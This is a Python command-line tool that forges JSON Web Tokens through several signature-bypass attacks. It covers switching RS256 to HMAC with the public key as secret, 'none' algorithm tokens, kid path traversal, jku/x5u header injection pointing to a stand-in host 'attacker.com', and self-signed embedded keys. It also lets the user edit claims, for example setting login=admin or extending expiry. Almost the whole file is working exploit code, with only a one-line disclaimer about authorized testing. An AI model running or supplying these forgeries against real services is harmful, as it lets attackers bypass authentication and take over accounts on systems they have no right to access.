#!/usr/bin/env python3
"""
JWT Algorithm Confusion Attack Tool

This script implements various JWT algorithm confusion attacks, including:
- Algorithm switching (RS256 → HS256/HS384/HS512) using public key as HMAC secret
- 'none' algorithm attack
- Key ID (kid) manipulation
- JWK header injection
- Embedded JWK attack

For educational and authorized security testing purposes only.
"""

import base64
import json
import hmac
import hashlib
import argparse
import sys
import os
import re
from typing import Dict, Tuple, Optional, Any, Union, List
from datetime import datetime, timedelta

# Optional cryptography imports for advanced features
try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    CRYPTOGRAPHY_AVAILABLE = True
except ImportError:
    CRYPTOGRAPHY_AVAILABLE = False


def parse_args() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="JWT Algorithm Confusion Attack Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types:
  hmac           - Switch algorithm to HMAC (HS256/HS384/HS512) using public key as secret
  none           - Set algorithm to 'none' to bypass signature verification
  kid            - Manipulate the 'kid' (Key ID) parameter
  jwk-injection  - Include a crafted JWK in the header
  embedded-jwk   - Embed the key directly in the token header
  x5u            - Add an X.509 URL pointing to a crafted certificate
  key-confusion  - Use symmetric key for asymmetric verification

Examples:
  python3 jwt_confusion.py --token eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9... --key public.pem
  python3 jwt_confusion.py --token eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9... --key public.pem --modify login=admin
  python3 jwt_confusion.py --token eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9... --key public.pem --algorithm HS384
  python3 jwt_confusion.py --token eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9... --attack none
  python3 jwt_confusion.py --token eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9... --attack kid --kid-value ../../../../../dev/null
  python3 jwt_confusion.py --token eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9... --attack embedded-jwk --gen-key
  python3 jwt_confusion.py --token eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9... --modify exp=+3600
"""
    )
    parser.add_argument("--token", "-t", help="JWT token to modify")
    parser.add_argument("--key", "-k", help="Key file (PEM format) for signing or verification")
    parser.add_argument(
        "--algorithm", "-a", default="HS256", 
        help="Algorithm to use for the forged token (default: HS256)"
    )
    parser.add_argument(
        "--attack", default="hmac", choices=["hmac", "none", "kid", "jwk-injection", "embedded-jwk", "x5u", "key-confusion"],
        help="Type of attack to perform (default: hmac)"
    )
    parser.add_argument(
        "--modify", "-m", action="append", default=[],
        help="Modify payload fields in format key=value. Use +/-N for exp/nbf/iat to adjust by seconds."
    )
    parser.add_argument(
        "--kid-value", default="../../../../../dev/null",
        help="Value to use for the 'kid' parameter when using 'kid' attack"
    )
    parser.add_argument(
        "--jwk-url", default="https://attacker.com/jwk.json",
        help="URL to use for the 'x5u' or 'jku' parameter"
    )
    parser.add_argument(
        "--gen-key", action="store_true",
        help="Generate a new key pair for embedded-jwk or jwk-injection attacks"
    )
    parser.add_argument(
        "--raw-token", action="store_true",
        help="Print only the token without any additional output"
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true", 
        help="Enable verbose output"
    )
    parser.add_argument(
        "--print-decoded", "-p", action="store_true",
        help="Print decoded header and payload of the original token and exit"
    )
    parser.add_argument(
        "--header", action="append", default=[],
        help="Add or modify header fields in format key=value"
    )
    parser.add_argument(
        "--file", "-f", 
        help="Read token from file instead of command line"
    )
    parser.add_argument(
        "--output", "-o",
        help="Write forged token to file instead of stdout"
    )
    
    args = parser.parse_args()
    
    # If no token is provided directly, try to read from file
    if not args.token and args.file:
        try:
            with open(args.file, 'r') as f:
                args.token = f.read().strip()
        except Exception as e:
            sys.exit(f"Error reading token from file: {e}")
    
    # Validate required arguments
    if not args.token:
        parser.error("No token provided. Use --token or --file")
    
    if args.attack != "none" and args.attack != "kid" and not args.gen_key and not args.key:
        parser.error("Key file (--key) is required for this attack type")
    
    return args


def base64_url_decode(input_str: str) -> bytes:
    """Decode a base64url string to bytes."""
    # Add padding if needed
    padding = '=' * (4 - len(input_str) % 4)
    if padding == '====':
        padding = ''
    return base64.urlsafe_b64decode(input_str + padding)


def base64_url_encode(input_bytes: bytes) -> str:
    """Encode bytes to a base64url string without padding."""
    return base64.urlsafe_b64encode(input_bytes).decode('utf-8').rstrip('=')


def parse_jwt(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
    """Parse a JWT token into its header, payload, and signature."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            sys.exit(f"Invalid JWT format. Expected 3 parts, got {len(parts)}")
            
        header_b64, payload_b64, signature = parts
        header_json = base64_url_decode(header_b64).decode('utf-8')
        header = json.loads(header_json)
        
        payload_json = base64_url_decode(payload_b64).decode('utf-8')
        payload = json.loads(payload_json)
        
        return header, payload, signature
    except Exception as e:
        sys.exit(f"Error parsing JWT token: {e}")


def modify_payload(payload: Dict[str, Any], modifications: list) -> Dict[str, Any]:
    """Modify payload with the provided key-value pairs."""
    modified = payload.copy()
    for mod in modifications:
        try:
            key, value = mod.split('=', 1)
            
            # Handle special timestamp modifications (exp, nbf, iat)
            if key in ['exp', 'nbf', 'iat'] and (value.startswith('+') or value.startswith('-')):
                # Get current timestamp if needed
                if key in modified:
                    current = modified[key]
                else:
                    current = int(datetime.now().timestamp())
                    
                try:
                    # Apply offset in seconds
                    offset = int(value)
                    modified[key] = current + offset
                except ValueError:
                    sys.exit(f"Invalid time offset: {value}")
                continue
                
            # Try to convert the value to proper type
            try:
                if value.lower() == 'true':
                    value = True
                elif value.lower() == 'false':
                    value = False
                elif value.lower() == 'null' or value == 'None':
                    value = None
                elif value.isdigit():
                    value = int(value)
                elif value.replace('.', '', 1).isdigit() and value.count('.') == 1:
                    value = float(value)
                elif value.startswith("{") and value.endswith("}"):
                    # Try to parse as JSON
                    value = json.loads(value)
                elif value.startswith("[") and value.endswith("]"):
                    # Try to parse as JSON array
                    value = json.loads(value)
            except (ValueError, AttributeError, json.JSONDecodeError):
                pass
                
            modified[key] = value
        except ValueError:
            sys.exit(f"Error: Invalid modification format. Use 'key=value' format: {mod}")
    return modified


def modify_header(header: Dict[str, Any], modifications: list) -> Dict[str, Any]:
    """Modify header with the provided key-value pairs."""
    modified = header.copy()
    for mod in modifications:
        try:
            key, value = mod.split('=', 1)
            
            # Try to convert the value to proper type
            try:
                if value.lower() == 'true':
                    value = True
                elif value.lower() == 'false':
                    value = False
                elif value.lower() == 'null' or value == 'None':
                    value = None
                elif value.isdigit():
                    value = int(value)
                elif value.replace('.', '', 1).isdigit() and value.count('.') == 1:
                    value = float(value)
                elif value.startswith("{") and value.endswith("}"):
                    # Try to parse as JSON
                    value = json.loads(value)
                elif value.startswith("[") and value.endswith("]"):
                    # Try to parse as JSON array
                    value = json.loads(value)
            except (ValueError, AttributeError, json.JSONDecodeError):
                pass
                
            modified[key] = value
        except ValueError:
            sys.exit(f"Error: Invalid header modification format. Use 'key=value' format: {mod}")
    return modified


def generate_rsa_key_pair() -> Tuple[Dict[str, Any], bytes]:
    """Generate an RSA key pair and return the public key as JWK and private key as PEM."""
    if not CRYPTOGRAPHY_AVAILABLE:
        sys.exit("The cryptography package is required for key generation. Install with: pip install cryptography")
        
    # Generate a private key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    # Extract public key
    public_key = private_key.public_key()
    
    # Convert to PEM format for storage
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    # Extract components for JWK
    numbers = public_key.public_numbers()
    e_bytes = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, byteorder='big')
    n_bytes = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, byteorder='big')
    
    # Create JWK
    jwk = {
        "kty": "RSA",
        "e": base64_url_encode(e_bytes),
        "n": base64_url_encode(n_bytes),
        "alg": "RS256",
        "kid": "attacker-key-" + datetime.now().strftime("%Y%m%d%H%M%S")
    }
    
    return jwk, private_pem


def read_key_file(key_path: str) -> bytes:
    """Read a key file and return its contents."""
    try:
        with open(key_path, 'rb') as f:
            return f.read()
    except Exception as e:
        sys.exit(f"Error reading key file: {e}")


def hmac_attack(header: Dict[str, Any], payload: Dict[str, Any], key_data: bytes, algorithm: str) -> str:
    """Implement the HMAC algorithm confusion attack."""
    # Update algorithm in header
    header['alg'] = algorithm
    
    # Encode header and payload
    header_b64 = base64_url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64_url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    # Create data portion
    data = f"{header_b64}.{payload_b64}"
    
    # Create signature based on algorithm
    if algorithm == 'HS256':
        digest = hashlib.sha256
    elif algorithm == 'HS384':
        digest = hashlib.sha384
    elif algorithm == 'HS512':
        digest = hashlib.sha512
    else:
        sys.exit(f"Unsupported algorithm: {algorithm}")
        
    signature = hmac.new(key_data, data.encode('utf-8'), digest).digest()
    signature_b64 = base64_url_encode(signature)
    
    return f"{data}.{signature_b64}"


def none_attack(header: Dict[str, Any], payload: Dict[str, Any]) -> str:
    """Implement the 'none' algorithm attack."""
    # Try multiple variants of 'none' algorithm
    none_variants = [
        'none',
        'None',
        'NONE',
        'nOnE'
    ]
    
    # Pick first variant by default
    header['alg'] = none_variants[0]
    
    # Encode header and payload
    header_b64 = base64_url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64_url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    # Create data portion
    data = f"{header_b64}.{payload_b64}"
    
    # Return token with empty signature
    return f"{data}."


def kid_attack(header: Dict[str, Any], payload: Dict[str, Any], kid_value: str) -> str:
    """Implement the Key ID (kid) manipulation attack."""
    # Set the algorithm to 'none' or keep existing
    if 'alg' not in header:
        header['alg'] = 'none'
        
    # Set the kid parameter
    header['kid'] = kid_value
    
    # Encode header and payload
    header_b64 = base64_url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64_url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    # Create data portion
    data = f"{header_b64}.{payload_b64}"
    
    # Return token with empty signature
    return f"{data}."


def jwk_injection_attack(header: Dict[str, Any], payload: Dict[str, Any], jwk_url: str) -> str:
    """Implement the JWK header injection attack."""
    # Set the algorithm to RS256
    header['alg'] = 'RS256'
    
    # Add the JWK URL
    header['jku'] = jwk_url
    
    # Encode header and payload
    header_b64 = base64_url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64_url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    # Create data portion
    data = f"{header_b64}.{payload_b64}"
    
    # Return token with empty signature
    # In a real attack, this would be signed with a private key matching the JWK set at the URL
    return f"{data}."


def embedded_jwk_attack(header: Dict[str, Any], payload: Dict[str, Any]) -> str:
    """Implement the embedded JWK attack."""
    if not CRYPTOGRAPHY_AVAILABLE:
        sys.exit("The cryptography package is required for the embedded-jwk attack. Install with: pip install cryptography")
        
    # Generate a key pair
    jwk, private_key_pem = generate_rsa_key_pair()
    
    # Embed the JWK in the header
    header['alg'] = 'RS256'
    header['jwk'] = jwk
    
    # Encode header and payload
    header_b64 = base64_url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64_url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    # Create data portion
    data = f"{header_b64}.{payload_b64}"
    
    # Load the private key for signing
    private_key = serialization.load_pem_private_key(
        private_key_pem,
        password=None,
        backend=default_backend()
    )
    
    # Sign the data
    signature = private_key.sign(
        data.encode('utf-8'),
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    
    signature_b64 = base64_url_encode(signature)
    
    return f"{data}.{signature_b64}"


def x5u_attack(header: Dict[str, Any], payload: Dict[str, Any], url: str) -> str:
    """Implement the X.509 URL (x5u) attack."""
    # Set the algorithm to RS256
    header['alg'] = 'RS256'
    
    # Add the X.509 URL
    header['x5u'] = url
    
    # Encode header and payload
    header_b64 = base64_url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64_url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    # Create data portion
    data = f"{header_b64}.{payload_b64}"
    
    # Return token with empty signature
    # In a real attack, this would be signed with a private key matching the certificate at the URL
    return f"{data}."


def key_confusion_attack(header: Dict[str, Any], payload: Dict[str, Any], key_data: bytes) -> str:
    """Implement the key confusion attack (using symmetric key for asymmetric verification)."""
    # Ensure algorithm is an asymmetric one
    header['alg'] = 'RS256'
    
    # Encode header and payload
    header_b64 = base64_url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64_url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    # Create data portion
    data = f"{header_b64}.{payload_b64}"
    
    # Sign with HMAC (as if it were a symmetric key)
    signature = hmac.new(key_data, data.encode('utf-8'), hashlib.sha256).digest()
    signature_b64 = base64_url_encode(signature)
    
    return f"{data}.{signature_b64}"


def print_key_info(key_data: bytes, verbose: bool = False) -> None:
    """Print information about the key file."""
    if not CRYPTOGRAPHY_AVAILABLE:
        return
        
    try:
        # Try to load as public key
        public_key = serialization.load_pem_public_key(
            key_data,
            backend=default_backend()
        )
        key_type = "Public Key"
        
        if verbose:
            if isinstance(public_key, rsa.RSAPublicKey):
                numbers = public_key.public_numbers()
                print(f"RSA Public Key Details:")
                print(f"  Modulus (n): {numbers.n}")
                print(f"  Public Exponent (e): {numbers.e}")
            else:
                print(f"Public Key (non-RSA)")
                
    except Exception:
        try:
            # Try to load as private key
            private_key = serialization.load_pem_private_key(
                key_data,
                password=None,
                backend=default_backend()
            )
            key_type = "Private Key"
            
            if verbose:
                if isinstance(private_key, rsa.RSAPrivateKey):
                    numbers = private_key.private_numbers()
                    print(f"RSA Private Key Details:")
                    print(f"  Modulus (n): {numbers.public_numbers.n}")
                    print(f"  Public Exponent (e): {numbers.public_numbers.e}")
                else:
                    print(f"Private Key (non-RSA)")
                    
        except Exception:
            key_type = "Unknown"
    
    if verbose:
        print(f"Key Type: {key_type}")
        print(f"Key Size: {len(key_data)} bytes")


def main() -> None:
    """Main function."""
    args = parse_args()
    
    # Parse the original token
    header, payload, signature = parse_jwt(args.token)
    
    # If requested, just print decoded token and exit
    if args.print_decoded:
        print("Decoded Header:")
        print(json.dumps(header, indent=2))
        print("\nDecoded Payload:")
        print(json.dumps(payload, indent=2))
        sys.exit(0)
    
    # Read the key file if provided
    key_data = None
    if args.key:
        key_data = read_key_file(args.key)
        if args.verbose:
            print_key_info(key_data, args.verbose)
    
    # Modify the payload
    modified_payload = modify_payload(payload, args.modify)
    
    # Modify the header
    modified_header = modify_header(header, args.header)
    
    # Verbose output for original token
    if args.verbose and not args.raw_token:
        print("\nOriginal Token:", args.token)
        print("\nOriginal Header:", json.dumps(header, indent=2))
        print("\nOriginal Payload:", json.dumps(payload, indent=2))
        print("\nOriginal Algorithm:", header.get('alg', 'none'))
        
        # Show modifications
        if payload != modified_payload:
            print("\nModified Payload:", json.dumps(modified_payload, indent=2))
        if header != modified_header:
            print("\nModified Header:", json.dumps(modified_header, indent=2))
    
    # Create forged token based on attack type
    forged_token = None
    
    if args.attack == "hmac":
        forged_token = hmac_attack(modified_header, modified_payload, key_data, args.algorithm)
        
    elif args.attack == "none":
        forged_token = none_attack(modified_header, modified_payload)
        
    elif args.attack == "kid":
        forged_token = kid_attack(modified_header, modified_payload, args.kid_value)
        
    elif args.attack == "jwk-injection":
        forged_token = jwk_injection_attack(modified_header, modified_payload, args.jwk_url)
        
    elif args.attack == "embedded-jwk":
        forged_token = embedded_jwk_attack(modified_header, modified_payload)
        
    elif args.attack == "x5u":
        forged_token = x5u_attack(modified_header, modified_payload, args.jwk_url)
        
    elif args.attack == "key-confusion":
        forged_token = key_confusion_attack(modified_header, modified_payload, key_data)
    
    # Output the forged token
    if forged_token:
        if args.output:
            try:
                with open(args.output, 'w') as f:
                    f.write(forged_token)
                if not args.raw_token:
                    print(f"Forged token written to {args.output}")
            except Exception as e:
                sys.exit(f"Error writing to output file: {e}")
        else:
            if args.raw_token:
                print(forged_token)
            else:
                print("\nForged Token:")
                print(forged_token)
    else:
        sys.exit("Failed to create forged token")


if __name__ == "__main__":
    main()
